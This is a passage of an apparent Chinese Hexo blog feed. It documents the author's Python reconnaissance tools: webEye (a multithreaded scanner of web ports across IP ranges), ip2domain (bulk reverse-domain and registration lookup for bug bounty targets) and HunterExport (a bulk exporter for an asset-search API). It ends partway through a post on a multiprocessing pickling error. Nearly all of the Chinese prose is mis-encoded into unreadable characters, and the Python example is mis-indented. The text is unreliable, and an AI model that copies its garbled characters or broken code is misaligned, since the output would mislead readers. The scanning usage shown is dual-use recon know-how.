¼</strong></li></ol><p><strong>å¼€å‘ç¯å¢ƒ</strong>ï¼šPython 3.7ã€Win10</p><h2 id="ğŸ‰å®‰è£…-amp-amp-è¯´æ˜"><a href="#ğŸ‰å®‰è£…-amp-amp-è¯´æ˜" class="headerlink" title="ğŸ‰å®‰è£…&amp;&amp;è¯´æ˜"></a>ğŸ‰å®‰è£…&amp;&amp;è¯´æ˜</h2><h4 id="å®‰è£…å·¥å…·"><a href="#å®‰è£…å·¥å…·" class="headerlink" title="å®‰è£…å·¥å…·"></a>å®‰è£…å·¥å…·</h4><p>ä¸‹è½½é¡¹ç›®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Sma11New&#x2F;webEye.git</span><br></pre></td></tr></table></figure><p>å®‰è£…ä¾èµ–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><h4 id="å‚æ•°è¯´æ˜"><a href="#å‚æ•°è¯´æ˜" class="headerlink" title="å‚æ•°è¯´æ˜"></a>å‚æ•°è¯´æ˜</h4><p>webEyeæœ‰ä»¥ä¸‹å‚æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">webEye.py [-h] [-i IP] [-f FILE] [-p PORT] [-t THREAD] [-T TIMEOUT] [-o OUTPUT]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help                     show this help message and exit</span><br><span class="line">  -i IP, --ip IP                 Target ip, eg:127.0.0.1&#x2F;24  ã€ç›®æ ‡ipã€‘</span><br><span class="line">  -f FILE, --file FILE           Target ip list file   ã€ipåˆ—è¡¨æ–‡ä»¶ã€‘</span><br><span class="line">  -p PORT, --port PORT           request port (default 80,81,88,443,4430,8080,8081,8181,8443,9000) ã€ç›®æ ‡ç«¯å£ã€‘</span><br><span class="line">  -t THREAD, --thread THREAD     Number of thread (default 512) ã€çº¿ç¨‹ï¼Œé»˜è®¤512ã€‘</span><br><span class="line">  -T TIMEOUT, --Timeout TIMEOUT  Request timeout (default 3) ã€è¯·æ±‚è¶…æ—¶ï¼Œé»˜è®¤3ã€‘</span><br><span class="line">  -o OUTPUT, --output OUTPUT     Output file (default .&#x2F;output&#x2F;webEye_title_&#123;date&#125;.csv)</span><br></pre></td></tr></table></figure><p><strong>webEyeæ”¯æŒçš„ipã€portå‚æ•°æ ¼å¼ï¼š</strong></p><p>-i/â€“ip å‚æ•°æ”¯æŒçš„æ ¼å¼ï¼š</p><ul><li>  192.168.1.1/24</li><li>  192.168.1.1-20</li><li>  192.168.1.*</li><li>  192.168.1-6.*</li></ul><p>-p/â€“port å‚æ•°æ”¯æŒçš„æ ¼å¼ï¼š</p><ul><li>  80,443,8080</li><li>  1-8080</li></ul><p>å¯ä½¿ç”¨â€,â€éš”å¼€ä¸€æ¬¡æŒ‡å®šå¤šä¸ªï¼Œå¦‚ï¼š<code>-i 192.168.1.1-20,192.168.1-5.*,10.0.0.1/24</code></p><h2 id="ğŸ­ä½¿ç”¨ç¤ºä¾‹"><a href="#ğŸ­ä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="ğŸ­ä½¿ç”¨ç¤ºä¾‹"></a>ğŸ­ä½¿ç”¨ç¤ºä¾‹</h2><p>å¯åœ¨å‘½ä»¤è¡Œä¸­ç”¨-i/â€“ipæŒ‡å®šç›®æ ‡ipï¼Œæ”¯æŒå¤šç§æ ¼å¼å’Œå¤šä¸ªå‚æ•°ï¼Œä½¿ç”¨è‹±æ–‡é€—å·éš”å¼€ï¼Œ-p/â€“portåŒç†</p><p>ä¹Ÿå¯å°†ç›®æ ‡ipä¿¡æ¯å†™å…¥æ–‡ä»¶ï¼Œä¸€è¡Œä¸€ä¸ªç›®æ ‡ipï¼Œæ”¯æŒå¤šç§æ ¼å¼ï¼Œå¯ç›´æ¥å°†å¸¦åè®®ã€ç«¯å£çš„åœ°å€å†™å…¥ï¼Œçœå»å¸ˆå‚…ä»¬åˆ æ‰åè®®ã€ç«¯å£çš„æ“ä½œï¼Œå¼Ÿå¼Ÿåœ¨ç¨‹åºé‡Œå†™å¥½äº†ã€‚å¦‚ï¼ˆ127.0.0.1 æˆ– 127.0.0.1:8080 æˆ– <a href="http://127.0.0.1:8080ï¼‰ï¼Œipæ–‡ä»¶å®ä¾‹ï¼š">http://127.0.0.1:8080ï¼‰ï¼Œipæ–‡ä»¶å®ä¾‹ï¼š</a></p><p>ipList.txtï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.1&#x2F;24</span><br><span class="line">192.168.2.1-200</span><br><span class="line">192.168.1-5.*</span><br></pre></td></tr></table></figure><p>å‚æ•°ç¤ºä¾‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 webEye.py -i 192.168.1.1&#x2F;16</span><br><span class="line">python3 webEye.py -i 192.168.1.1-20,192.168.1-5.* -p 80,8080,100-999</span><br><span class="line">python3 webEye.py -f ipList.txt -p 1-65535</span><br></pre></td></tr></table></figure><p>æ¢æµ‹æ¼”ç¤ºï¼š</p><p>æŒ‡å®šç›®æ ‡ipæ–‡ä»¶è¿›è¡Œwebèµ„äº§æ¢æµ‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\webEye.py -f E:\Desktop\ip.txt -p 80,8080,443,9090</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image_2021-10-10_14-38-36.png" alt="image_2021-10-10_14-38-36"></p><p>ç¨‹åºæ²¡ä»€ä¹ˆç»“æ„æ€§ï¼Œä¸è¿‡èƒ½è·‘èµ·æ¥ã€èƒ½ç”¨çš„å°±æ˜¯å¥½ç¨‹åºï¼Œæ¬¢è¿å¸ˆå‚…ä»¬ä½¿ç”¨ã€‚</p><h2 id="â­é¡¹ç›®åœ°å€"><a href="#â­é¡¹ç›®åœ°å€" class="headerlink" title="â­é¡¹ç›®åœ°å€"></a>â­é¡¹ç›®åœ°å€</h2><p><strong>Githubï¼š<a href="https://github.com/Sma11New/webEye">https://github.com/Sma11New/webEye</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> å·¥å…·ç¯‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webèµ„äº§æ¢æµ‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å·¥å…·ç¯‡ã€‘ip2domain - æ‰¹é‡ipåæŸ¥åŸŸååŠå¤‡æ¡ˆä¿¡æ¯å·¥å…·</title>
      <link href="post/202109202133.html"/>
      <url>post/202109202133.html</url>
      
        <content type="html"><![CDATA[<h3 id="ğŸ¯ç®€è¿°"><a href="#ğŸ¯ç®€è¿°" class="headerlink" title="ğŸ¯ç®€è¿°"></a>ğŸ¯ç®€è¿°</h3><p>ip2domainæ˜¯ä¸€æ¬¾è‡ªå†™çš„æ‰¹é‡ipåæŸ¥åŸŸååŠå¤‡æ¡ˆä¿¡æ¯å·¥å…·ï¼Œåœ¨æ‰¹é‡æŒ–SRCæ—¶ï¼Œé€šå¸¸ä¼šç”¨è¾ƒæ–°çš„æ¼æ´POCæ‰¹é‡è·‘fofaæˆ–å…¶ä»–ç©ºé—´æµ‹ç»˜çš„ç›¸å…³èµ„äº§ipï¼Œè¯¥å·¥å…·å¯ç”¨äºå¯¹è·‘åˆ°çš„ipæ‰¹é‡<strong>åæŸ¥åŸŸå</strong>åŠ<strong>å¤‡æ¡ˆä¿¡æ¯</strong>ï¼Œå¿«é€Ÿç¡®å®šipæ‰€å±ä¼ä¸šï¼Œæ–¹ä¾¿æäº¤æ¼æ´ã€‚</p><h3 id="ğŸ“¢è¯´æ˜"><a href="#ğŸ“¢è¯´æ˜" class="headerlink" title="ğŸ“¢è¯´æ˜"></a>ğŸ“¢è¯´æ˜</h3><p>è¯¥å·¥å…·æ˜¯åœ¨ä¹‹å‰çš„webEyeä¸Šæ”¹è¿›è€Œæ¥ï¼Œç”±äºwebEyeæ˜¯æ£€æµ‹IPç«¯å£ç«™ç‚¹å­˜æ´»ååœ¨é¡µé¢åŒ¹é…ICPå·æŸ¥è¯¢å¤‡æ¡ˆä¿¡æ¯ï¼Œå‡†ç¡®ç‡è¾ƒä½ï¼Œå› æ­¤æ”¹è¿›ä¸ºè°ƒç”¨æ¥å£æŸ¥è¯¢ã€‚</p><p><strong>åŠŸèƒ½ç‰¹ç‚¹å¦‚ä¸‹ï¼š</strong></p><ol><li> å¿«é€Ÿæ‰¹é‡æŸ¥è¯¢å¤‡æ¡ˆä¿¡æ¯ï¼›</li><li> ç»“æœå¯¼å‡ºè‡³Excelè¡¨æ ¼ï¼›</li><li> ä½¿ç”¨å¤šçº¿ç¨‹åŠ å¿«é€Ÿåº¦ï¼›</li></ol><p>ä»£ç ä¸­å¯¹åŸŸååšæå–ä¸»åŸŸå’Œå·²æŸ¥è¯¢æ ‡è®°ï¼ŒåŒä¸€åŸŸåä»…æŸ¥è¯¢å¹¶è¾“å‡ºä¸€æ¬¡ã€‚</p><p><strong>æ³¨æ„ï¼š</strong></p><p>å½“<strong>åæŸ¥åŸŸå</strong>åˆ—å‡ºç°â€â€“ Connect Failed â€“â€æ—¶è¡¨ç¤º<strong>åæŸ¥åŸŸå</strong>æ¥å£è¯·æ±‚å‡ºé”™</p><p>å½“<strong>å•ä½åç§°</strong>åˆ—å‡ºç°â€â€“ Connect Failed â€“â€æ—¶è¡¨ç¤º<strong>å¤‡æ¡ˆä¿¡æ¯</strong>æ¥å£è¯·æ±‚å‡ºé”™</p><p>å‡ºç°ä»¥ä¸Šé—®é¢˜ææœ‰å¯èƒ½æ˜¯è¯·æ±‚é¢‘ç‡è¿‡é«˜ï¼Œä½†ç”±äºæ˜¯è°ƒç”¨apiè€Œä¸æ˜¯æ¨¡æ‹Ÿæµè§ˆå™¨è¯·æ±‚ï¼Œå› æ­¤å‡ºç°çš„æ¦‚ç‡æå°ã€‚</p><h3 id="ğŸš©ä½¿ç”¨"><a href="#ğŸš©ä½¿ç”¨" class="headerlink" title="ğŸš©ä½¿ç”¨"></a>ğŸš©ä½¿ç”¨</h3><p>å®‰è£…ä¾èµ–ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">usage: ip2domain.py [-h] -f  [-t] [-T] [-o]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help      show this help message and exit</span><br><span class="line">  -f, --file      Target IP file</span><br><span class="line">  -t, --thread    Number of thread (default 32)</span><br><span class="line">  -T, --Timeout   request timeout (default 3)</span><br><span class="line">  -o, --output    output file (default .&#x2F;output&#x2F;&#123;fileName&#125;_title_&#123;date&#125;.csv)</span><br></pre></td></tr></table></figure><p>å°†è¦æŸ¥è¯¢çš„ipæ”¾åœ¨txtæ–‡ä»¶å†…ä¸€è¡Œä¸€ä¸ªï¼Œä»¥ä¸‹å‡ ç§æ ¼å¼å‡å¯ï¼š</p><ul><li>  å•çº¯ipï¼š127.0.0.1</li><li>  å¸¦ç«¯å£ï¼š127.0.0.1:8080</li><li>  å¸¦httpã€httpsåè®®ï¼š<a href="https://127.0.0.1/">https://127.0.0.1</a></li><li>  å¸¦åè®®åŠç«¯å£ï¼š<a href="https://127.0.0.1:8080/">https://127.0.0.1:8080</a></li></ul><p>å¯å¤„ç†å¤šç§æ ¼å¼æ•°æ®ï¼Œé€‚åº”å„ç§å·¥å…·çš„å¯¼å‡ºç»“æœã€‚</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20210920091939132.png" alt="image-20210920091939132"></p><p><code>python ip2domain.py -f [file]</code> æŒ‡å®šæ–‡ä»¶å³å¯ï¼Œå…¶ä½™å‚æ•°ä¸ºå¯é€‰ï¼š</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image_2021-09-18_16-41-34.png" alt="image_2021-09-18_16-41-34"></p><p>400å¤šipç”¨æ—¶8ç§’ï¼Œå½“å‰çº¿ç¨‹32ï¼Œç»“æœæ–‡ä»¶ï¼š</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image_2021-09-18_16-39-54.png" alt="image_2021-09-18_16-39-54"></p><h3 id="ğŸˆåœ°å€"><a href="#ğŸˆåœ°å€" class="headerlink" title="ğŸˆåœ°å€"></a>ğŸˆåœ°å€</h3><p>Githubåœ°å€ï¼š<a href="https://github.com/Sma11New/ip2domain">https://github.com/Sma11New/ip2domain</a></p><p><strong>æ¬¢è¿ä½¿ç”¨ï¼Œæˆ‘æ„¿ç§°ä¹‹ä¸ºæœ€å¼º</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> å·¥å…·ç¯‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ipåæŸ¥åŸŸå </tag>
            
            <tag> ipæŸ¥å¤‡æ¡ˆä¿¡æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å·¥å…·ç¯‡ã€‘HunterExport - QAXå…¨çƒé¹°æ•°æ®æ‰¹é‡æŸ¥è¯¢å¯¼å‡ºå·¥å…·</title>
      <link href="post/202109162133.html"/>
      <url>post/202109162133.html</url>
      
        <content type="html"><![CDATA[<h3 id="ğŸ“ç®€è¿°"><a href="#ğŸ“ç®€è¿°" class="headerlink" title="ğŸ“ç®€è¿°"></a>ğŸ“ç®€è¿°</h3><p>ç”±äºå…¨çƒé¹°Hunterç›®å‰ä»…æ”¯æŒæ¯å¤©å¯¼å‡º1000æ¡æ•°æ®ï¼Œå› æ­¤å†™äº†è¯¥å·¥å…·è°ƒç”¨æŸ¥è¯¢APIï¼Œå¯æ— é™åˆ¶å¯¼å‡ºæŸ¥è¯¢ç»“æœè‡³Excelè¡¨æ ¼ã€‚</p><p>ç›®å‰å…¨çƒé¹°ä»…å¯¹å…¬å¸å†…éƒ¨å¼€æ”¾ï¼Œå› æ­¤å…¨ç¨‹éœ€è¦<strong>æ¥å…¥å…¬å¸å†…ç½‘</strong>ã€‚æ¥å…¥å†…ç½‘åï¼Œç™»å½•å®‰æœæ­¦å™¨åº“å…¨çƒé¹°Hunterè·å–ç”¨æˆ·åï¼ˆé‚®ç®±ï¼‰å’Œå¯†é’¥ï¼ˆKeyï¼‰ï¼Œå†™å…¥default.confé…ç½®æ–‡ä»¶ï¼Œè¿è¡Œ HunterEcport.py è¾“å…¥æŸ¥è¯¢æŒ‡ä»¤å³å¯è·å–æ•°æ®ï¼Œå¹¶è¾“å‡ºè‡³æ–‡ä»¶ã€‚</p><h3 id="âœ¨æ›´æ–°"><a href="#âœ¨æ›´æ–°" class="headerlink" title="âœ¨æ›´æ–°"></a>âœ¨æ›´æ–°</h3><p><strong>å½“å‰ç‰ˆæœ¬ä¸ºç¬¬äºŒç‰ˆï¼Œæ›´æ–°æƒ…å†µå¦‚ä¸‹ï¼š</strong></p><ol><li> ä¿®å¤å…¨çƒé¹°åŠ å…¥è¯·æ±‚ç¼–ç åç¬¬ä¸€ç‰ˆæ— æ³•ä½¿ç”¨é—®é¢˜</li><li> æ”¯æŒæ–‡ä»¶æ‰¹é‡æŸ¥è¯¢</li><li> åŠ å…¥æ—¥å¿—ç³»ç»Ÿ</li><li> å¢åŠ é…ç½®æ–‡ä»¶é¡¹ï¼Œè§£å†³è¯·æ±‚å‡ºé”™é—®é¢˜</li><li> ä¿®å¤bugï¼Œä¼˜åŒ–ç¨‹åºï¼Œå®Œå–„åŠŸèƒ½</li></ol><h3 id="ğŸª“é…ç½®æ–‡ä»¶"><a href="#ğŸª“é…ç½®æ–‡ä»¶" class="headerlink" title="ğŸª“é…ç½®æ–‡ä»¶"></a>ğŸª“é…ç½®æ–‡ä»¶</h3><ul><li>  mail = <a href="mailto:&#101;&#x78;&#x61;&#109;&#x70;&#x6c;&#x65;&#x40;&#113;&#x69;&#x61;&#110;&#120;&#x69;&#110;&#x2e;&#99;&#x6f;&#109;">&#101;&#x78;&#x61;&#109;&#x70;&#x6c;&#x65;&#x40;&#113;&#x69;&#x61;&#110;&#120;&#x69;&#110;&#x2e;&#99;&#x6f;&#109;</a>  - é‚®ç®±</li><li>  key = abcdefgh12345678987654321hgfedcba - key</li><li>  countMax  - å¯¼å‡ºæ•°é‡å°é¡¶é™åˆ¶ï¼Œè¶Šå¤§è¶Šæ…¢ï¼Œé€‚é‡å¢å‡ï¼Œå•ä½ï¼šæ¡</li><li>  searchMonth  - æŸ¥è¯¢æ—¶é—´èŒƒå›´ï¼Œ12ã€24æ°å½“ï¼Œè¶Šé•¿è¶Šå®¹æ˜“å‡ºç°æ­»èµ„äº§ï¼Œå•ä½ï¼šæœˆ</li><li>  timeSleep - è¯·æ±‚æ—¶å»¶ï¼Œè¶Šå°è¶Šå¿«ï¼Œè¶Šå®¹æ˜“è¯·æ±‚é”™è¯¯ï¼Œ0.5sã€1sæ°å½“ï¼Œé€‚é‡å¢å‡ï¼Œå•ä½ï¼šç§’</li><li>  isWeb - æ˜¯å¦ä»…æŸ¥è¯¢webèµ„äº§ï¼Œ1æ˜¯2å¦</li></ul><p>æŒ‰éœ€ä¿®æ”¹å³å¯ã€‚</p><h3 id="ğŸš©ä½¿ç”¨"><a href="#ğŸš©ä½¿ç”¨" class="headerlink" title="ğŸš©ä½¿ç”¨"></a>ğŸš©ä½¿ç”¨</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Usage: python3 HunterExport.py</span><br><span class="line">    Command&gt; app&#x3D;&quot;***&quot;      (å•æ¬¡æŸ¥è¯¢)</span><br><span class="line">    Command&gt; file filePath  (æ‰¹é‡æŸ¥è¯¢)</span><br><span class="line">    Command&gt; hlep           (è¯­æ³•æŸ¥è¯¢)    </span><br></pre></td></tr></table></figure><p>å•ä¸ªæŸ¥è¯¢  <code>app=&quot;***&quot;</code>  ï¼ˆå½“å‰timeSleepä¸º0ï¼Œä¼šå‡ºç°è¯·æ±‚é¢‘ç‡å¤ªé«˜ï¼‰ï¼š</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image_2021-09-16_14-00-35.png" alt="image_2021-09-16_14-00-35"></p><p>æ–‡ä»¶æ‰¹é‡æŸ¥è¯¢  <code>file filePath</code> ï¼ˆä¿®æ”¹é…ç½®é—®ä»·timeSleepä¸º0.5ï¼Œè¯·æ±‚å‡ºé”™é—®é¢˜è§£å†³ï¼‰ï¼š</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image_2021-09-16_14-09-08.png" alt="image_2021-09-16_14-09-08"></p><p>æŸ¥è¯¢ç»“æœåŠdebug.logæ—¥å¿—æ–‡ä»¶ï¼š</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20210916143427590.png" alt="image-20210916143427590"></p><p>å…¶ä¸­æ—¥å¿—è®°å½•æœ‰ä¸‰ä¸ªå…³é”®å­—ï¼š</p><ol><li> SCMDï¼šsearch commandï¼Œè®°å½•æŸ¥è¯¢è¿‡çš„å‘½ä»¤</li><li> INFOï¼šinformationï¼Œè®°å½•ç¨‹åºè¿è¡Œä¸­äº§ç”Ÿçš„ä¿¡æ¯</li><li> ERRORï¼šerrorï¼Œè®°å½•ç¨‹åºçš„æŠ¥é”™ä¿¡æ¯</li></ol><p>å¯æ ¹æ®éœ€æ±‚å°†æ—¥å¿—æ‹†åˆ†ï¼Œä¿å­˜SCMDè®°å½•ï¼Œå³å¯æŸ¥çœ‹æ‰€æœ‰å†å²æŸ¥è¯¢è®°å½•ã€‚</p><h3 id="ğŸ”‘åœ°å€"><a href="#ğŸ”‘åœ°å€" class="headerlink" title="ğŸ”‘åœ°å€"></a>ğŸ”‘åœ°å€</h3><p>Githubåœ°å€ï¼š<a href="https://github.com/Sma11New/HunterExport">https://github.com/Sma11New/HunterExport</a></p><p><strong>æ¬¢è¿ä½¿ç”¨</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> å·¥å…·ç¯‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> èµ„äº§æµ‹ç»˜ </tag>
            
            <tag> å…¨çƒé¹°æ•°æ®å¯¼å‡º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è§£å†³Python Classä¸­è¿›ç¨‹æ± Poolå¯¹è±¡æ— æ³•ä½œä¸ºç±»å±æ€§è¿›è¡Œä¼ é€’é—®é¢˜</title>
      <link href="post/20210152133.html"/>
      <url>post/20210152133.html</url>
      
        <content type="html"><![CDATA[<p>åœ¨ä½¿ç”¨Pythonçš„å¤šè¿›ç¨‹æ¨¡å—multiprocessingçš„è¿›ç¨‹æ± Poolè¿›è¡Œå¤šè¿›ç¨‹æ“ä½œæ—¶ï¼Œå½“åœ¨ç±»ä¸­æŠŠè¿›ç¨‹æ± Poolè®¾ä¸ºç±»å±æ€§<code>self.pool = Pool()</code>ï¼ŒåŒæ—¶æŠŠselfä½œä¸ºå‚æ•°ä¼ ç»™è¿›ç¨‹æ± ä¸­çš„å‡½æ•°çš„æ—¶å€™ä¼šæŠ¥é”™ï¼ˆ<code>NotImplementedError: pool objects cannot be passed between processes or pickled</code>ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tests</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, numList</span>):</span></span><br><span class="line">        self.numList = numList</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printTest</span>(<span class="params">self, num</span>):</span></span><br><span class="line">        print(num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">    self.pool = Pool()</span><br><span class="line">        self.pool.<span class="built_in">map</span>(self.printTest, self.numList)</span><br><span class="line">        self.pool.close()</span><br><span class="line">        self.pool.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    numList = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    Tests(numList).run()</span><br></pre></td></tr></table></figure><p>æŠ¥é”™ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;E:/3.PythonProject/myTool/Source/networkScan/tcpScan.py&quot;, line 162, in &lt;module&gt;</span><br><span class="line">    Tests(numList).run()</span><br><span class="line">  File &quot;E:/3.PythonProject/myTool/Source/networkScan/tcpScan.py&quot;, line 145, in run</span><br><span class="line">    self.pool.map(self.printTest, self.numList)</span><br><span class="line">  File &quot;C:\Users\13714\AppData\Local\Programs\Python\Python37\lib\multiprocessing\pool.py&quot;, line 268, in map</span><br><span class="line">    return self._map_async(func, iterable, mapstar, chunksize).get()</span><br><span class="line">  File &quot;C:\Users\13714\AppData\Local\Programs\Python\Python37\lib\multiprocessing\pool.py&quot;, line 657, in get</span><br><span class="line">    raise self._value</span><br><span class="line">  File &quot;C:\Users\13714\AppData\Local\Programs\Python\Python37\lib\multiprocessing\pool.py&quot;, line 431, in _handle_tasks</span><br><span class="line">    put(task)</span><br><span class="line">  File &quot;C:\Users\13714\AppData\Local\Programs\Python\Python37\lib\multiprocessing\connection.py&quot;, line 206, in send</span><br><span class="line">    self._send_bytes(_ForkingPickler.dumps(obj))</span><br><span class="line">  File &quot;C:\Users\13714\AppData\Local\Programs\Python\Python37\lib\multiprocessing\reduction.py&quot;, line 51, in dumps</span><br><span class="line">    cls(buf, protocol).dump(obj)</span><br><span class="line">  File &quot;C:\Users\13714\AppData\Local\Programs\Python\Python37\lib\multiprocessing\pool.py&quot;, line 535, in __reduce__</span><br><span class="line">    &#x27;pool objects cannot be passed between processes or pickled&#x27;</span><br><span class="line">NotImplementedError: pool objects cannot be passed between processes or pickled</span><br></pre></td></tr></table></figure><p>æŠ¥é”™æç¤ºï¼Œ<strong>Poolæ± å¯¹è±¡ä¸èƒ½å¤Ÿåœ¨è¿›ç¨‹é—´ä¼ é€’æˆ–ä¸èƒ½è¢«pickle</strong>ï¼Œpickleæ˜¯Pythonä¸­çš„åºåˆ—åŒ–æ¨¡å—ï¼Œè·Ÿå…¶å®ƒè¯­è¨€ä¸€æ ·ï¼Œå½“éœ€è¦å¯¹å¯¹è±¡è¿›è¡ŒæŒä¹…åŒ–å­˜å‚¨æ—¶ï¼Œå°±ä¼šç”¨åˆ°åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œåœ¨phpå’Œjavaä¸­åºåˆ—åŒ–çš„ç»“æœæ˜¯äººç±»å¯è¯»çš„Jsonä¸²ï¼Œè€Œpickleç»“æœæ˜¯äººç±»æ— æ³•è¯†åˆ«çš„æ•°æ®ï¼Œè¿™ä¹Ÿèµ·åˆ°äº†ç§æœ‰çš„ä½œç”¨ã€‚</p><p>å½“pickleåºåˆ—åŒ–å®ä¾‹æ–¹æ³•æ—¶ï¼ŒPythonéœ€è¦pickleæ•´ä¸ªå¯¹è±¡ï¼ŒåŒ…æ‹¬å®ƒçš„å®ä¾‹å˜é‡ã€‚è¿™äº›å®ä¾‹å˜é‡ä¹‹ä¸€æ˜¯å¯¹è±¡æœ¬èº«ï¼Œè€ŒPoolå¯¹è±¡ä¸èƒ½è¿›è¡Œpickleï¼Œå› æ­¤å‡ºç°é”™è¯¯ã€‚è‡³äºPoolå¯¹è±¡ä¸ºä»€ä¹ˆä¸èƒ½è¢«pickleï¼Œæœ¬èœè¿˜æœªææ¸…æ¥šã€‚</p><p>æŸ¥è¯¢+æ¢ç´¢å¾—çŸ¥ï¼Œç›®å‰å¤§è‡´æœ‰ä»¥ä¸‹å‡ ç§è§£å†³æ–¹æ¡ˆ</p><h3 id="æ–¹æ³•ä¸€ï¼šæŒ‡å®šPoolå¯¹è±¡ä¸è¢«pickle"><a href="#æ–¹æ³•ä¸€ï¼šæŒ‡å®šPoolå¯¹è±¡ä¸è¢«pickle" class="headerlink" title="æ–¹æ³•ä¸€ï¼šæŒ‡å®šPoolå¯¹è±¡ä¸è¢«pickle"></a>æ–¹æ³•ä¸€ï¼šæŒ‡å®šPoolå¯¹è±¡ä¸è¢«pickle</h3><p>å½“pickleå®ä¾‹æ–¹æ³•æ—¶ï¼ŒPythonéœ€è¦pickleæ•´ä¸ªå¯¹è±¡ï¼Œå¦‚æœå°†Poolå¯¹è±¡å†™å…¥ç±»å±æ€§è¿›è¡Œä¼ é€’ï¼Œåˆ™ä¹ŸåŒ…æ‹¬Poolå¯¹è±¡ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡åœ¨å¯¹è±¡ä¸Šå®ç°<code>__getstate__</code>é­”æœ¯æ–¹æ³•ï¼Œå¹¶ä½¿ç”¨å®ƒåœ¨pickleä¹‹å‰ä»å®ä¾‹ä¸­åˆ é™¤Poolå¯¹è±¡æ¥è§£å†³æ­¤é—®é¢˜ã€‚</p><p>è¿™é‡Œæ¶‰åŠåˆ°å’Œpickleæœ‰å…³çš„ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼š</p><ul><li><code>__getstate__</code></li><li><code>__setstate__(state)</code></li></ul><p><code>__getstate__</code>æ€»æ˜¯åœ¨pickleå¯¹è±¡ä¹‹å‰è¢«è°ƒç”¨ï¼Œå®ƒå…è®¸ä½ 